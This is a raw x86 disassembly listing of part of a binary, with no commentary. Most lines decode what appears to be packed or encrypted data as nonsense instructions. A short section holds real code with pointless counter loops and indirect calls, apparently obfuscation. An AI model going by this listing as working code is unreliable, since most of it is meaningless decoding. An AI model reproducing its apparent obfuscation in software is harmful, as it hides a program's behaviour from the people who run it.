  408bc8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408bc9:	and    cl,dh
  408bcb:	cwde   
  408bcc:	into   
  408bcd:	mov    ebp,0x361c085b
  408bd2:	ret    
  408bd3:	sbb    esp,esp
  408bd5:	dec    ebp
  408bd6:	scas   al,BYTE PTR es:[edi]
  408bd7:	retf   
  408bd8:	push   edi
  408bd9:	in     al,0xe5
  408bdb:	(bad)  
  408bdc:	call   0xcaf5e25e
  408be1:	jbe    0x408c03
  408be3:	xchg   bh,dh
  408be5:	ins    BYTE PTR es:[edi],dx
  408be6:	inc    esp
  408be7:	or     al,BYTE PTR [ebx+0x13]
  408bea:	cdq    
  408beb:	aaa    
  408bec:	jl     0x408c4c
  408bee:	sbb    al,ch
  408bf0:	xor    eax,eax
  408bf2:	sbb    al,0x76
  408bf4:	rcl    dl,cl
  408bf6:	push   eax
  408bf7:	pushf  
  408bf8:	xchg   edx,eax
  408bf9:	xor    esi,DWORD PTR [edx+0x477142a2]
  408bff:	adc    ebx,ebx
  408c01:	fcomip st,st(5)
  408c03:	dec    esp
  408c04:	and    DWORD PTR [ebx-0x73],ebx
  408c07:	or     al,ch
  408c09:	xchg   ecx,eax
  408c0a:	adc    esp,eax
  408c0c:	dec    esp
  408c0d:	mov    cl,0x48
  408c0f:	mov    ebp,0x638c9d5b
  408c14:	push   ebx
  408c15:	sub    eax,0x3e4564be
  408c1a:	jmp    0xdb83:0xc8a55dfc
  408c21:	pop    ds
  408c22:	inc    esp
  408c23:	sbb    esi,edx
  408c25:	inc    ebp
  408c26:	cld    
  408c27:	loope  0x408c8b
  408c29:	aaa    
  408c2a:	cld    
  408c2b:	jmp    0xcf42:0x1079a926
  408c32:	add    al,0x84
  408c34:	xlat   BYTE PTR ds:[ebx]
  408c35:	loope  0x408bca
  408c37:	or     BYTE PTR [esi+0x32a2f8a8],bh
  408c3d:	loope  0x408c92
  408c3f:	les    edi,FWORD PTR [ebp+0x578e3be9]
  408c45:	add    al,0xa3
  408c47:	int3   
  408c48:	(bad)  
  408c49:	mov    al,BYTE PTR [edx+0x280474a8]
  408c4f:	inc    DWORD PTR [eax+0x5]
  408c52:	xchg   ecx,eax
  408c53:	mov    ecx,0xf974771e
  408c58:	sbb    al,0x1a
  408c5a:	mov    al,ds:0xb26f9e03
  408c5f:	jno    0x408c82
  408c61:	mov    ebx,0x8d499cf
  408c66:	xchg   edi,eax
  408c67:	or     DWORD PTR [eax-0x6e257692],edx
  408c6d:	adc    al,0x2b
  408c6f:	lea    esp,[ebx-0x565633a0]
  408c75:	call   0x313f416b
  408c7a:	js     0x408c71
  408c7c:	retfw  
  408c7e:	dec    eax
  408c7f:	or     edi,ecx
  408c81:	pushf  
  408c82:	arpl   WORD PTR [edx-0xa04c350],ax
  408c88:	ret    
  408c89:	mov    eax,ds:0x76174bbc
  408c8e:	mov    edi,0xfd603d3
  408c93:	scas   eax,DWORD PTR es:[edi]
  408c94:	xlat   BYTE PTR ds:[ebx]
  408c95:	sub    DWORD PTR [eax],edx
  408c97:	mov    eax,DWORD PTR [ebp-0x14]
  408c9a:	jmp    0x408756
  408c9f:	mov    eax,DWORD PTR [ebp-0xc]
  408ca2:	mov    edx,DWORD PTR [ebp-0x18]
  408ca5:	jmp    0x408e2c
  408caa:	test   ecx,ebx
  408cac:	stc    
  408cad:	test   BYTE PTR [ecx+0x64],ah
  408cb0:	sbb    ecx,0x67327607
  408cb6:	or     ah,BYTE PTR [edx-0x23eb6e85]
  408cbc:	jle    0x408d3c
  408cbe:	in     al,0x7f
  408cc0:	jle    0x408d40
  408cc2:	dec    edi
  408cc3:	mov    edx,DWORD PTR [ecx+ebx*2+0x5b]
  408cc7:	mov    ebx,0x779b1493
  408ccc:	xor    al,0x48
  408cce:	xor    eax,0x6e12d38e
  408cd3:	dec    eax
  408cd4:	adc    BYTE PTR [ebx+0x71cd59bc],dl
  408cda:	enter  0x9ac1,0x7d
  408cde:	fisttp QWORD PTR [ecx]
  408ce0:	pushf  
  408ce1:	nop
  408ce2:	ss pop edi
  408ce4:	ins    BYTE PTR es:[edi],dx
  408ce5:	inc    ebx
  408ce6:	jmp    0x9b97ded9
  408ceb:	or     eax,ebp
  408ced:	imul   ecx,DWORD PTR [esi+0x24],0xfffffffd
  408cf1:	or     eax,0x33ee7da1
  408cf6:	xor    al,0xa
  408cf8:	push   0xe9a5819b
  408cfd:	mov    BYTE PTR [esi+0xf],bh
  408d00:	mov    BYTE PTR [eax-0x67],dl
  408d03:	and    al,0x5e
  408d05:	mov    edx,0x90b69f5e
  408d0a:	jb     0x408d1e
  408d0c:	adc    BYTE PTR [ecx],0xb9
  408d0f:	add    eax,0x81354f63
  408d14:	push   ss
  408d15:	out    dx,eax
  408d16:	push   ecx
  408d17:	inc    ebx
  408d18:	lea    ebp,[ebx]
  408d1a:	xchg   ebp,eax
  408d1b:	xor    BYTE PTR [esi],0x6b
  408d1e:	mov    al,0xf9
  408d20:	adc    bl,BYTE PTR [edi+esi*2+0x35]
  408d24:	clc    
  408d25:	sahf   
  408d26:	popf   
  408d27:	or     bh,dh
  408d29:	sbb    eax,0x67ecbbe3
  408d2e:	jno    0x408d72
  408d30:	push   ss
  408d31:	inc    esi
  408d32:	add    eax,0xf176dd4a
  408d37:	xor    al,0x27
  408d39:	std    
  408d3a:	dec    esi
  408d3b:	out    0x4d,al
  408d3d:	jle    0x408cc5
  408d3f:	or     eax,edi
  408d41:	pop    esi
  408d42:	fldcw  WORD PTR [edi+0x29]
  408d45:	into   
  408d46:	xor    eax,0xf8a44e2d
  408d4b:	scas   eax,DWORD PTR es:[edi]
  408d4c:	iret   
  408d4d:	das    
  408d4e:	pop    ebx
  408d4f:	in     al,0x8c
  408d51:	jb     0x408d45
  408d53:	xchg   BYTE PTR [edx+ebx*1+0x1e1fc3b1],ah
  408d5a:	push   cs
  408d5b:	sub    al,0x49
  408d5d:	jno    0x408db0
  408d5f:	mov    BYTE PTR [edi],dl
  408d61:	xchg   edi,eax
  408d62:	xchg   ecx,eax
  408d63:	add    eax,DWORD PTR [ebp+0x4a]
  408d66:	sti    
  408d67:	in     al,0xa7
  408d69:	adc    BYTE PTR [edi-0x2b],0x17
  408d6d:	jge    0x408d12
  408d6f:	cmp    eax,0x3d82d2c
  408d74:	push   esp
  408d75:	mov    bh,BYTE PTR [eax+0xafa3591]
  408d7b:	leave  
  408d7c:	pop    ss
  408d7d:	pop    ecx
  408d7e:	into   
  408d7f:	shl    al,cl
  408d81:	je     0x408d6e
  408d83:	scas   al,BYTE PTR es:[edi]
  408d84:	enter  0xaa9e,0x4f
  408d88:	jnp    0x408dac
  408d8a:	inc    edx
  408d8b:	into   
  408d8c:	jecxz  0x408dae
  408d8e:	cmc    
  408d8f:	scas   al,BYTE PTR es:[edi]
  408d90:	test   DWORD PTR [esi],0x64c2b7b7
  408d96:	pop    ds
  408d97:	stos   DWORD PTR es:[edi],eax
  408d98:	js     0x408d62
  408d9a:	mov    esp,0x81f3febe
  408d9f:	sbb    eax,0x70e5c42f
  408da4:	jp     0x408d97
  408da6:	mov    esi,0xcc437664
  408dab:	pushf  
  408dac:	std    
  408dad:	dec    esi
  408dae:	push   ebp
  408daf:	(bad)  
  408db0:	jge    0x408d99
  408db2:	add    esp,DWORD PTR ds:0xfde27f33
  408db8:	jne    0x408d6b
  408dba:	and    DWORD PTR [ebx],edi
  408dbc:	xchg   edi,eax
  408dbd:	xchg   ebp,eax
  408dbe:	fild   QWORD PTR [ebx-0x10]
  408dc1:	imul   esp,esi,0xffffff83
  408dc4:	mov    esi,0x738a0544
  408dc9:	adc    BYTE PTR [edx],ah
  408dcb:	mov    BYTE PTR [ebx-0x407c9445],ah
  408dd1:	cmp    ah,bh
  408dd3:	aad    0xce
  408dd5:	cwde   
  408dd6:	pop    eax
  408dd7:	push   edi
  408dd8:	ror    ah,0x7e
  408ddb:	out    0x66,al
  408ddd:	adc    BYTE PTR [ebx+0x1a9f6eed],bl
  408de3:	push   ds
  408de4:	fbld   TBYTE PTR [eax+0xdb4e1e8]
  408dea:	jns    0x408d80
  408dec:	mov    al,0x90
  408dee:	xor    DWORD PTR [ebx+ebp*1],edx
  408df1:	test   eax,0x151ebc64
  408df6:	mov    al,0xa7
  408df8:	cli    
  408df9:	in     eax,dx
  408dfa:	loop   0x408e78
  408dfc:	mov    DWORD PTR [edi+ebp*8-0x4281af01],ecx
  408e03:	clc    
  408e04:	xor    bh,BYTE PTR [esi-0x28]
  408e07:	cmp    BYTE PTR [ebx-0x3faab5c6],cl
  408e0d:	ret    
  408e0e:	sbb    ebp,DWORD PTR [ecx-0x2d]
  408e11:	mov    al,ds:0xa8423341
  408e16:	push   esp
  408e17:	shl    DWORD PTR [eax-0x17],1
  408e1a:	pop    ss
  408e1b:	in     al,0x32
  408e1d:	stc    
  408e1e:	mov    dh,0xf7
  408e20:	(bad)  
  408e21:	ds pop ss
  408e23:	sti    
  408e24:	ficom  DWORD PTR [ecx+edi*1-0x61]
  408e28:	and    al,0x6b
  408e2a:	mov    cl,0xf2
  408e2c:	xor    eax,edx
  408e2e:	cmp    eax,0x7aa80c5b
  408e33:	je     0x40858a
  408e39:	mov    eax,DWORD PTR [ebp-0x10]
  408e3c:	add    DWORD PTR [eax],0x7403501
  408e42:	jmp    0x40858a
  408e47:	mov    eax,DWORD PTR [ebp-0x1c]
  408e4a:	jmp    0x408fd1
  408e4f:	xor    eax,0xa417048d
  408e54:	xchg   edi,eax
  408e55:	xor    eax,0xaa1dcad
  408e5a:	jmp    0xb89e7c88
  408e5f:	cli    
  408e60:	fnstsw WORD PTR [esi+0x7e]
  408e63:	in     al,0x7f
  408e65:	jle    0x408ee5
  408e67:	sbb    ebp,esi
  408e69:	fcomp  QWORD PTR [esi-0x13]
  408e6c:	in     al,dx
  408e6d:	cmp    DWORD PTR [eax-0x45],0xd2fcc0d4
  408e74:	mov    dh,0x4b
  408e76:	sub    DWORD PTR ds:0x811cfc89,edx
  408e7c:	paddb  mm2,QWORD PTR [ebx-0x48]
  408e80:	pand   mm0,QWORD PTR es:[eax+0x17]
  408e85:	scas   eax,DWORD PTR es:[edi]
  408e86:	arpl   WORD PTR [edx+0x41],sp
  408e89:	jno    0x408ed0
  408e8b:	mov    eax,0xa13902fb
  408e90:	pop    ebx
  408e91:	lods   al,BYTE PTR ds:[esi]
  408e92:	lea    edx,[edi]
  408e94:	add    al,0x36
  408e96:	sub    DWORD PTR [esi],0xffffffa3
  408e99:	sbb    ebx,ebx
  408e9b:	repnz aad 0x50
  408e9e:	sahf   
  408e9f:	pop    ss
  408ea0:	rcr    BYTE PTR [edx-0x28],0xfe
  408ea4:	adc    eax,0x455f6cd1
  408ea9:	xchg   DWORD PTR ds:0xe9d659c,esp
  408eaf:	push   esp
  408eb0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408eb1:	jae    0x408e83
  408eb3:	push   ds
  408eb4:	mov    ebp,0xb7fa8790
  408eb9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408eba:	clc    
  408ebb:	(bad)  [edi+0x75]
  408ebe:	ficom  DWORD PTR [eax+0x18]
  408ec1:	add    eax,0xbaa6077
  408ec6:	not    BYTE PTR [edx+eax*2]
  408ec9:	stos   BYTE PTR es:[edi],al
  408eca:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408ecb:	push   esp
  408ecc:	in     al,0x84
  408ece:	(bad)  
  408ecf:	fucom  st(3)
  408ed1:	add    eax,0x1ec175d
  408ed6:	mov    ah,0xac
  408ed8:	jb     0x408e78
  408eda:	sub    al,0xcf
  408edc:	ja     0x408ef4
  408ede:	and    eax,0xc99ff525
  408ee3:	ins    BYTE PTR es:[edi],dx
  408ee4:	in     al,dx
  408ee5:	xor    ch,BYTE PTR [edx+0x12]
  408ee8:	xchg   esp,eax
  408ee9:	jg     0x408f33
  408eeb:	outs   dx,DWORD PTR ds:[esi]
  408eec:	ins    DWORD PTR es:[edi],dx
  408eed:	clc    
  408eee:	test   al,0x93
  408ef0:	adc    edx,DWORD PTR [ecx+edx*8]
  408ef3:	cwde   
  408ef4:	int3   
  408ef5:	fisub  WORD PTR [ebp-0x47]
  408ef8:	sbb    ebx,0x3a
  408efb:	xlat   BYTE PTR ds:[ebx]
  408efc:	push   esp
  408efd:	jge    0x408f55
  408eff:	sar    bh,1
  408f01:	out    0xfd,al
  408f03:	int    0x9
  408f05:	cli    
  408f06:	cmp    eax,0xffffff9b
  408f09:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408f0a:	mov    ds:0x47bc7b5a,eax
  408f0f:	sbb    esi,edx
  408f11:	div    ecx
  408f13:	rcl    BYTE PTR ds:[ebp+0x6],cl
  408f17:	jns    0x408f8a
  408f19:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408f1a:	dec    edi
  408f1b:	rol    BYTE PTR [ebx-0x62],0x76
  408f1f:	retf   
  408f20:	into   
  408f21:	loop   0x408f48
  408f23:	cmp    dl,BYTE PTR [eax]
  408f25:	jecxz  0x408f25
  408f27:	scas   eax,DWORD PTR es:[edi]
  408f28:	iret   
  408f29:	mov    eax,ds:0x8b92f02c
  408f2e:	scas   eax,DWORD PTR es:[edi]
  408f2f:	or     dh,bh
  408f31:	stc    
  408f32:	fisttp WORD PTR [esi-0x2a0223e]
  408f38:	sub    BYTE PTR [ebp-0x305ce580],ah
  408f3e:	push   eax
  408f3f:	adc    eax,0x4566ec8e
  408f44:	and    DWORD PTR [ecx-0x56842716],eax
  408f4a:	mov    ds:0xbe1f4347,eax
  408f4f:	xchg   ebx,eax
  408f50:	and    edi,DWORD PTR [eax+0x5d8f0e23]
  408f56:	lock lds esi,FWORD PTR [ecx+0x55]
  408f5a:	sub    eax,0xd0e4593a
  408f5f:	push   edx
  408f60:	and    DWORD PTR [edi-0x1c],eax
  408f63:	mov    edx,0xecb4a5bb
  408f68:	cs pushf 
  408f6a:	arpl   WORD PTR [ebp-0x155ee73a],ax
  408f70:	aad    0x9d
  408f72:	stos   DWORD PTR es:[edi],eax
  408f73:	mov    edi,0xefcfd454
  408f78:	outs   dx,BYTE PTR ds:[esi]
  408f79:	mov    ebx,0x766d713c
  408f7e:	div    DWORD PTR [edx-0x1f]
  408f81:	pop    edi
  408f82:	jbe    0x408f7a
  408f84:	inc    esp
  408f85:	test   al,0xc5
  408f87:	pop    edx
  408f88:	mov    ebp,0x7f5aa5cc
  408f8d:	stos   BYTE PTR es:[edi],al
  408f8e:	pop    ecx
  408f8f:	jno    0x409001
  408f91:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408f92:	sbb    DWORD PTR [eax+0x58],esp
  408f95:	cmp    al,0xf
  408f97:	aas    
  408f98:	sub    al,0x30
  408f9a:	bnd jno 0x408f8e
  408f9d:	jmp    0xb7946aaf
  408fa2:	lahf   
  408fa3:	inc    edx
  408fa4:	fucomip st,st(0)
  408fa6:	push   ss
  408fa7:	pop    edi
  408fa8:	les    ebp,FWORD PTR [edi-0x7dfbfa2e]
  408fae:	dec    al
  408fb0:	mov    ebp,0xd0e4179a
  408fb5:	pusha  
  408fb6:	or     BYTE PTR [edi-0x7f],ah
  408fb9:	xlat   BYTE PTR ds:[ebx]
  408fba:	mov    ebx,0x331f44ce
  408fbf:	(bad)  
  408fc1:	xlat   BYTE PTR ds:[ebx]
  408fc2:	into   
  408fc3:	loop   0x408f9f
  408fc5:	pop    DWORD PTR [eax]
  408fc7:	rol    BYTE PTR [esi],0x43
  408fca:	stc    
  408fcb:	mov    fs,WORD PTR [ecx-0x5]
  408fce:	sub    ebp,eax
  408fd0:	sub    edi,DWORD PTR [ecx]
  408fd2:	cmp    BYTE PTR [edi],cl
  408fd4:	test   BYTE PTR [ecx-0x4700000b],dh
  408fda:	call   0xf8fe:0xe9800f1c
  408fe1:	(bad)  
  408fe2:	call   DWORD PTR [ebp-0x75]
  408fe5:	in     al,dx
  408fe6:	sub    esp,0x20
  408fe9:	sub    ecx,eax
  408feb:	mov    eax,ds:0x413bde
  408ff0:	and    DWORD PTR ds:0x43382f,0x0
  408ffa:	jmp    0x40900c
  408fff:	mov    ecx,DWORD PTR ds:0x43382f
  409005:	inc    ecx
  409006:	mov    DWORD PTR ds:0x43382f,ecx
  40900c:	cmp    DWORD PTR ds:0x43382f,0x1c
  409013:	jae    0x409040
  409019:	cmp    DWORD PTR ds:0x43382f,0x20
  409020:	jne    0x40903b
  409026:	push   0x4819
  40902b:	push   0x30ae
  409030:	push   0x3675
  409035:	call   DWORD PTR ds:0x412014
  40903b:	jmp    0x408fff
  409040:	mov    eax,DWORD PTR [eax+0x198]
  409046:	mov    DWORD PTR [ebp-0x8],eax
  409049:	and    DWORD PTR ds:0x43386b,0x0
  409053:	mov    ecx,DWORD PTR ds:0x43386b
  409059:	inc    ecx
  40905a:	mov    DWORD PTR ds:0x43386b,ecx
  409060:	cmp    DWORD PTR ds:0x43386b,0x1c
  409067:	jne    0x409085
  40906d:	push   0x4338af
  409072:	push   0x494f
  409077:	push   0x43391a
  40907c:	push   DWORD PTR [ebp-0x24]
  40907f:	call   DWORD PTR ds:0x412394
  409085:	cmp    DWORD PTR ds:0x43386b,0x13
  40908c:	jb     0x409053
  409092:	mov    eax,DWORD PTR [ebp+0x8]
  409095:	and    ecx,DWORD PTR ds:0x433873
  40909b:	mov    ecx,DWORD PTR [ebp-0x8]
  40909e:	sbb    DWORD PTR ds:0x433883,0x4338bb
  4090a8:	push   ebx
  4090a9:	xor    DWORD PTR ds:0x4337f7,0x7c2a
  4090b3:	push   esi
  4090b4:	mov    esi,DWORD PTR ds:0x433847
  4090ba:	mov    ebx,DWORD PTR ds:0x43385b
  4090c0:	sub    ebx,esi
  4090c2:	or     esi,DWORD PTR [esi+ebx*1]
  4090c5:	mov    esi,0x7510854
  4090ca:	xor    eax,esi
  4090cc:	adc    DWORD PTR ds:0x433827,0x4337af
  4090d6:	push   edi
  4090d7:	mov    edi,0x32729b
  4090dc:	and    ebx,DWORD PTR ds:0x4337a7
  4090e2:	add    eax,edi
  4090e4:	mov    DWORD PTR [ecx],eax
  4090e6:	or     DWORD PTR ds:0x4338bb,ebx
  4090ec:	lea    eax,[ebp-0x4]
  4090ef:	mov    DWORD PTR [ebp-0x10],eax
  4090f2:	mov    eax,DWORD PTR [ebp+0x8]
  4090f5:	mov    ecx,DWORD PTR [ebp-0x10]
  4090f8:	xor    eax,esi
  4090fa:	sbb    ebx,0x3e7b
  409100:	add    eax,edi
  409102:	mov    DWORD PTR ds:0x433793,0x17
  40910c:	cmp    DWORD PTR ds:0x433793,0x0
  409113:	je     0x40914b
  409119:	cmp    DWORD PTR ds:0x433793,0x27
  409120:	jne    0x409139
  409126:	push   0x3901
  40912b:	push   0x70c3
  409130:	push   DWORD PTR [ebp-0x1c]
  409133:	call   DWORD PTR ds:0x412398
  409139:	mov    ebx,DWORD PTR ds:0x433793
  40913f:	dec    ebx
  409140:	mov    DWORD PTR ds:0x433793,ebx
  409146:	jmp    0x40910c
  40914b:	mov    DWORD PTR [ecx],eax
  40914d:	neg    DWORD PTR ds:0x433827
  409153:	jmp    0x409474
  409158:	add    eax,0x73dd76a0
  40915d:	jmp    0x619bf1f7
  409162:	mov    ch,0x2
  409164:	pusha  
  409165:	les    esp,FWORD PTR [ebx-0x59]
  409168:	pusha  
  409169:	fidivr DWORD PTR [esi+0x7e]
  40916c:	jp     0x4091eb
  40916e:	jle    0x4091ee
  409170:	retf   0xe72e
  409173:	sub    bl,ch
  409175:	xchg   edx,eax
  409176:	rcl    DWORD PTR [eax],1
  409178:	(bad)  
  409179:	sub    al,0xa6
  40917b:	addr16 push eax
  40917d:	call   0x7785:0xfd3a78a3
  409184:	sbb    al,0x3
  409186:	adc    al,0x56
  409188:	xor    bh,bl
  40918a:	pop    esp
  40918b:	int3   
  40918c:	jle    0x409162
  40918e:	mov    ebp,0xa89c17fe
  409193:	into   
  409194:	dec    ecx
  409195:	jp     0x409151
  409197:	mov    esi,edi
  409199:	jmp    0xd223fcbf
  40919e:	sbb    DWORD PTR [edi+ebx*8-0x72a9afbc],ebp
  4091a5:	push   ss
  4091a6:	cmp    BYTE PTR [esi+0x2],ah
  4091a9:	(bad)  
  4091aa:	jmp    0x40919f
  4091ac:	mov    ds:0x5a34cc8c,eax
  4091b1:	xor    BYTE PTR [esi-0x4d],0x71
  4091b5:	enter  0xe427,0x27
  4091b9:	mov    esi,DWORD PTR [esi-0x66]
  4091bc:	cmp    BYTE PTR [ebx+0x76],bl
  4091bf:	ins    BYTE PTR es:[edi],dx
  4091c0:	imul   esi,esi,0xffffffed
  4091c3:	sub    ebx,DWORD PTR [esi-0x34]
  4091c6:	lods   al,BYTE PTR ds:[esi]
  4091c7:	or     BYTE PTR [eax],0x72
  4091ca:	sub    dl,dl
  4091cc:	aam    0x86
  4091ce:	loope  0x4091de
  4091d0:	jb     0x409156
  4091d2:	leave  
  4091d3:	out    0xab,al
  4091d5:	enter  0xa126,0x31
  4091d9:	mov    bl,0x35
  4091db:	mov    ch,0xc4
  4091dd:	xchg   ebx,eax
  4091de:	sub    DWORD PTR ds:0xc1e99548,0xfffffff4
  4091e5:	retf   
  4091e6:	fldenv [edx]
  4091e8:	and    al,bl
  4091ea:	js     0x40918e
  4091ec:	push   ebp
  4091ed:	adc    eax,DWORD PTR [eax+0x1d5190ae]
  4091f3:	loope  0x409209
  4091f5:	jae    0x4091ad
  4091f7:	stos   DWORD PTR es:[edi],eax
  4091f8:	pop    ecx
  4091f9:	sub    DWORD PTR [ecx],esp
  4091fb:	stos   DWORD PTR es:[edi],eax
  4091fc:	aas    
  4091fd:	stc    
  4091fe:	ins    BYTE PTR es:[edi],dx
  4091ff:	xchg   edx,eax
  409200:	out    dx,al
  409201:	xchg   ebx,eax
  409202:	data16 jle 0x4091ae
  409205:	pop    ds
  409206:	aas    
  409207:	lea    ebx,ds:0xdddbf40b
  40920d:	xchg   edi,eax
  40920e:	outs   dx,DWORD PTR ds:[esi]
  40920f:	bound  esi,QWORD PTR [ebx+edx*1-0x6a5a0893]
  409216:	repnz add ebx,edx
  409219:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40921a:	mov    cl,0xb4
  40921c:	ins    BYTE PTR es:[edi],dx
  40921d:	es xor al,0x89
  409220:	xchg   BYTE PTR [eax-0x2a],dh
  409223:	jp     0x4092a1
  409225:	mov    ds:0x37ae30bd,al
  40922a:	(bad)  
  40922b:	jae    0x4091c2
  40922d:	dec    esp
  40922e:	ficom  WORD PTR [eax]
  409230:	mov    edi,0x676081c1
  409235:	cmc    
  409236:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409237:	adc    dh,cl
  409239:	sub    bh,BYTE PTR [ecx]
  40923b:	cmp    DWORD PTR [ecx+0x10],0x42b04eea
  409242:	mov    ds:0xd48bfb23,al
  409247:	hlt    
  409248:	lods   al,BYTE PTR ds:[esi]
  409249:	sbb    eax,0xf9a21e46
  40924e:	xor    eax,0xd57c94d9
  409253:	and    cl,BYTE PTR [esi+0x28]
  409256:	or     eax,0xa42512bc
  40925b:	xchg   edx,eax
  40925c:	test   BYTE PTR [edi+0x38],ah
  40925f:	pop    eax
  409260:	pop    ds
  409261:	pop    es
  409262:	lds    edx,FWORD PTR [esi+0xf50e6c4]
  409268:	push   ebp
  409269:	int    0x67
  40926b:	inc    edi
  40926c:	and    eax,0xe847da71
  409271:	pop    edx
  409272:	cdq    
  409273:	and    BYTE PTR [ecx-0x35],dh
  409276:	idiv   ebx
  409278:	dec    ebp
  409279:	shl    DWORD PTR [ebp-0x77],cl
  40927c:	inc    ebx
  40927d:	stos   DWORD PTR es:[edi],eax
  40927e:	xor    DWORD PTR [ebp-0x53ca7cc1],ebx
  409284:	xchg   ecx,ebx
  409286:	and    BYTE PTR [edi+0x6a9721f0],bl
  40928c:	push   ss
  40928d:	aas    
  40928e:	nop
  40928f:	xor    al,0x32
  409291:	call   0x559:0xa3077093
  409298:	sub    eax,0x255237a8
  40929d:	sbb    eax,0xb40cdd3a
  4092a2:	repz call DWORD PTR [ecx]
  4092a5:	jecxz  0x409272
  4092a7:	jno    0x40924e
  4092a9:	imul   edx,DWORD PTR [ecx+0x42c21183],0xffffffb9
  4092b0:	pushf  
  4092b1:	mov    ecx,DWORD PTR [edi+eax*4+0x52]
  4092b5:	test   eax,0xf3210a8c
  4092ba:	push   esp
  4092bb:	rol    DWORD PTR ds:0x88cab39a,cl
  4092c1:	jb     0x4092c1
  4092c3:	mov    BYTE PTR [ecx-0x6e],dh
  4092c6:	sub    eax,0x60198e4b
  4092cb:	scas   eax,DWORD PTR es:[edi]
  4092cc:	cld    
  4092cd:	fcomp  QWORD PTR [eax-0x4af3ee2f]
  4092d3:	ret    
  4092d4:	std    
  4092d5:	jae    0x4092a0
  4092d7:	sub    BYTE PTR [edx-0xa],cl
  4092da:	cmc    
  4092db:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4092dc:	sbb    DWORD PTR [edx-0x55],esi
  4092df:	mov    edi,DWORD PTR [edx]
  4092e1:	in     al,0xb8
  4092e3:	inc    ecx
  4092e4:	scas   eax,DWORD PTR es:[edi]
  4092e5:	xor    edx,DWORD PTR [ebx+0x6db8033b]
  4092eb:	hlt    
  4092ec:	cmc    
  4092ed:	jg     0x4092f1
  4092ef:	sbb    ch,BYTE PTR es:[eax+0x5c519dba]
  4092f6:	inc    eax
  4092f7:	pop    edi
  4092f8:	stos   BYTE PTR es:[edi],al
  4092f9:	or     BYTE PTR [ecx+0x47],ah
  4092fc:	ss mov ebx,0x69535aff
  409302:	xchg   ebx,eax
  409303:	xor    DWORD PTR [ebp+0x34],esi
  409306:	(bad)  
  409307:	(bad)  
  409308:	int    0xca
  40930a:	bound  esp,QWORD PTR [ebp-0x2c]
  40930d:	xor    BYTE PTR [edi],ch
  40930f:	push   0x5f
  409311:	or     dh,dh
  409313:	inc    edi
  409314:	pop    ebx
  409315:	pop    ebx
  409316:	jle    0x409360
  409318:	sahf   
  409319:	ret    
  40931a:	mov    ah,BYTE PTR [ecx+0x7d32467b]
  409320:	add    dh,al
  409322:	or     BYTE PTR [eax],al
  409324:	adc    al,0xc
  409326:	or     edx,DWORD PTR [ecx-0x75]
  409329:	xchg   edx,eax
  40932a:	arpl   WORD PTR [edi+0x6fe97198],bx
  409330:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409331:	jecxz  0x4093a8
  409333:	xor    DWORD PTR [eax-0x4e],eax
  409336:	mov    eax,0x4a4fa19
  40933b:	mov    eax,0xa01d37d4
  409340:	adc    eax,0xc91ad381
  409345:	dec    esi
  409346:	les    esp,FWORD PTR [edx]
  409348:	daa    
  409349:	fidivr DWORD PTR [ebp-0x2388103a]
  40934f:	inc    ebp
  409350:	inc    ebp
  409351:	out    dx,eax
  409352:	sub    DWORD PTR [edx],edx
  409354:	stos   BYTE PTR es:[edi],al
  409355:	dec    ebx
  409356:	loope  0x4093be
  409358:	mov    ?,WORD PTR [edx]
  40935a:	fwait
  40935b:	ins    BYTE PTR es:[edi],dx
  40935c:	xchg   esi,eax
  40935d:	sahf   
  40935e:	sti    
  40935f:	fmul   st(0),st
  409361:	fst    DWORD PTR [ebx-0x5e20cf9e]
  409367:	es add eax,0x1b6687ef
  40936d:	jge    0x40932e
  40936f:	js     0x4093d5
  409371:	mov    esi,DWORD PTR [ebx-0x11]
  409374:	cwde   
  409375:	mov    bl,0xc3
  409377:	xchg   ecx,eax
  409378:	stos   BYTE PTR es:[edi],al
  409379:	jno    0x4093e1
  40937b:	fistp  WORD PTR [eax+0x280f36e0]
  409381:	es fwait
  409383:	ss dec ebp
  409385:	or     DWORD PTR [esp+edi*1+0x48947db5],0xffffffee
  40938d:	imul   eax,DWORD PTR [esi],0xa9b322d0
  409393:	or     ebp,DWORD PTR ds:0x3a0ba3a1
  409399:	and    edx,DWORD PTR [eax]
  40939b:	rcr    DWORD PTR [ecx],cl
  40939d:	adc    al,0x97
  40939f:	sahf   
  4093a0:	add    esi,DWORD PTR [ecx-0xbd39d30]
  4093a6:	mov    ds:0x419baa72,al
  4093ab:	mov    ds:0xd28a8354,al
  4093b0:	shl    BYTE PTR [eax+0x64],0x54
  4093b4:	push   ebp
  4093b5:	mov    bl,0x76
  4093b7:	rcl    BYTE PTR [edi-0x7064ea1c],1
  4093bd:	imul   edi,DWORD PTR ss:[eax],0xffffffca
  4093c1:	add    BYTE PTR [ebx],dh
  4093c3:	pushaw 
  4093c5:	jo     0x40940a
  4093c7:	(bad)  
  4093c8:	(bad)  
  4093c9:	mov    eax,ds:0xcff3a5a6
  4093ce:	ins    BYTE PTR es:[edi],dx
  4093cf:	pop    esp
  4093d0:	arpl   WORD PTR [eax-0xffe7a78],cx
  4093d6:	xor    DWORD PTR [esi],edx
  4093d8:	es stos DWORD PTR es:[edi],eax
  4093da:	popa   
  4093db:	(bad)  
  4093dc:	lea    edi,ds:0xc2b34260
  4093e2:	push   cs
  4093e3:	cs and al,0xb3
  4093e6:	pop    ds
  4093e7:	mov    ecx,DWORD PTR [edi+0xf80678]
  4093ed:	jne    0x4093fd
  4093ef:	cdq    
  4093f0:	dec    BYTE PTR [ebp-0x31]
  4093f3:	push   esp
  4093f4:	inc    ebp
  4093f5:	fiadd  WORD PTR [ecx]
  4093f7:	mov    dl,0x5c
  4093f9:	sbb    al,0x69
  4093fb:	jns    0x409468
  4093fd:	jmp    DWORD PTR [ebp-0x6a]
  409400:	pop    ebp
  409401:	fnstcw WORD PTR [ebx+esi*8-0x5fdb1aee]
  409408:	cdq    
  409409:	add    bl,BYTE PTR ds:0xb9b968ae
